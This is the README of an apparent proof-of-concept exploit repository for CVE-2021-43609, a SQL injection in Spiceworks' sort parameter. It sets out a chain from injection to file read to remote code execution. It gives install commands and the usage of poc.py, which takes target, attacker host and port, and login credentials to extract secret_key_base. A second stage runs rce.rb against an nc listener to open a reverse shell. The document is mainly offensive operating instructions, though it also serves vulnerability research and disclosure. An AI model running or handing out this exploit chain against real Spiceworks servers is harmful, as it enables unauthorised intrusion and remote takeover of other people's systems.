
Proof of Concept Exploit for CVE-2021-43609

# [Spiceworks Sort SQLi](https://github.com/d5sec/CVE-2021-43609-POC#spiceworks-sort-sqli)

There's a SQLi in a `sort` parameter of Spiceworks. The full exploit chain is SQLi -> file read -> RCE.

## [Demo](https://github.com/d5sec/CVE-2021-43609-POC#demo)

[![asciicast](https://camo.githubusercontent.com/8ad74db50d53dae2b25c1556977385437afa9225b7186005134a6b301a2039d2/68747470733a2f2f61736369696e656d612e6f72672f612f794f6855677556634b3062726c49545771387439444c4c374a2e737667)](https://asciinema.org/a/yOhUguVcK0brlITWq8t9DLL7J?t=5:30)

## [Prerequisites](https://github.com/d5sec/CVE-2021-43609-POC#prerequisites)

```shell
apt update && apt install -y ruby-dev nodejs python3 python3-pip libsqlite3-dev
pip3 install requests
gem install bundler && cd rce && bundle install
```

## [Stage 1](https://github.com/d5sec/CVE-2021-43609-POC#stage-1)

Use `poc.py` to exploit the SQLi -> file read and extract the secret_key_base environment variable. It will then generate a PoC ruby script to gain a reverse shell, with the values obtained from `poc.py`.

### [Usage](https://github.com/d5sec/CVE-2021-43609-POC#usage)

```
usage: poc.py [-h] --rhost RHOST --lhost LHOST --lport LPORT -u USER -p PASSWORD [-e ENV_PATH]

There's a SQLi in a `sort` parameter of Spiceworks. The exploit chain is SQLi -> file read -> RCE.

optional arguments:
  -h, --help            show this help message and exit
  --rhost RHOST         https://example.com
  --lhost LHOST         10.10.10.10
  --lport LPORT         9001
  -u USER, --user USER  test@test.com
  -p PASSWORD, --password PASSWORD
                        P@$$w0rd!
  -e ENV_PATH, --env_path ENV_PATH
                        Path to environment variables
```

## [Stage 2](https://github.com/d5sec/CVE-2021-43609-POC#stage-2)

Use `rce.rb`. Spin up a nc listener on the IP & port you provided in Stage 1, then simply:

```shell
cd rce && ruby rce.rb
```

Voila!

# [Credits](https://github.com/d5sec/CVE-2021-43609-POC#credits)

- [@aidanstansfield](https://github.com/aidanstansfield)